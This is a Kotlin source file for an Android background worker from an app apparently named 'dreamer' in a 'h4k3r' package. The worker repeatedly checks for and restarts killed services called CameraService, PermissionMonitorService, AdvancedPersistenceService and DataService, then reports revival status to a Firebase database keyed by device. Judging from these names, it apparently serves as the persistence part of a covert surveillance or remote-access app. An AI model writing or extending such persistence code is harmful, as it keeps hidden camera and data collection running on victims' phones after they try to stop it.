package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

/**
 * WorkManager Worker for detecting process kills and reviving critical services.
 * This runs periodically to ensure services are running even after app process is killed.
 */
class ProcessRevivalWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "ProcessRevivalWorker"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Process revival worker started - checking service health")

            val criticalServices = listOf(
                "CameraService" to CameraService::class.java,
                "PermissionMonitorService" to PermissionMonitorService::class.java,
                "AdvancedPersistenceService" to AdvancedPersistenceService::class.java,
                "DataService" to DataService::class.java
            )

            var revivedServices = 0
            val notificationManager = NotificationAutoManager.getInstance(applicationContext)

            criticalServices.forEach { (serviceName, serviceClass) ->
                try {
                    if (!isServiceRunning(serviceClass.name)) {
                        Log.w(TAG, "$serviceName not running - attempting revival via ProcessRevivalWorker")

                        val intent = Intent(applicationContext, serviceClass)
                        val revived = try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                // Try foreground service first
                                applicationContext.startForegroundService(intent)
                                true
                            } else {
                                applicationContext.startService(intent)
                                true
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Foreground service failed for $serviceName, trying regular service: ${e.message}")
                            try {
                                applicationContext.startService(intent)
                                true
                            } catch (e2: Exception) {
                                Log.e(TAG, "Failed to revive $serviceName: ${e2.message}")
                                false
                            }
                        }

                        if (revived) {
                            revivedServices++
                            // Add to unified notification system
                            notificationManager.addActiveService(serviceName, "Revived")
                            Log.d(TAG, "$serviceName successfully revived via ProcessRevivalWorker")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking/reviving $serviceName: ${e.message}")
                }
            }

            // Update Firebase heartbeat to show revival system is working
            updateFirebaseRevivalStatus(revivedServices)

            Log.d(TAG, "Process revival check complete - revived $revivedServices services")

            Result.success()

        } catch (e: Exception) {
            Log.e(TAG, "Process revival worker failed: ${e.message}")
            Result.retry()
        }
    }

    private fun isServiceRunning(serviceName: String): Boolean {
        return try {
            val activityManager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            val isRunning = runningServices.any { it.service.className == serviceName }
            Log.d(TAG, "Service $serviceName running status: $isRunning")
            isRunning
        } catch (e: Exception) {
            Log.e(TAG, "Error checking service status for $serviceName: ${e.message}")
            false
        }
    }

    private fun updateFirebaseRevivalStatus(revivedCount: Int) {
        try {
            val prefs = applicationContext.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "")
            val deviceId = prefs.getString("device_id", "")

            if (!secretKey.isNullOrEmpty() && !deviceId.isNullOrEmpty()) {
                val revivalData = mapOf(
                    "last_revival_check" to System.currentTimeMillis(),
                    "services_revived" to revivedCount,
                    "revival_worker_active" to true
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("revival_status")
                    .setValue(revivalData)

                Log.d(TAG, "Firebase revival status updated: revived $revivedCount services")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update Firebase revival status: ${e.message}")
        }
    }
}